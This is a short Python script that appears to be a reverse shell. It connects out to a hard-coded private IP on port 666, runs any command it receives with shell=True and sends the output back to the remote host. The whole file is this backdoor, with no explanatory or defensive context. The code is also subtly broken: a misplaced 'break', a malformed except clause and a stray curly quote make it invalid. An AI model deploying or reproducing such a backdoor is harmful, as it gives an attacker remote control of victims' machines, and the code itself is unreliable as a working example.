#!/usr/bin/python
# coding:utf-8

import socket
import subprocess

ip_addr = "172.20.10.2"                                                                                     ’
port_number = 666

s = socket.socket()

while True:
    try:
        s.connect((ip_addr, port_number))
    break

    except:
    (socket.error, socket.timeout)
    continue

while True:
    command_to_exe = s.recv(99999)
    result =  subprocess.Popen(command_to_exe, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    result = result.stdout.read() + result.stderr.read()
    s.send(result)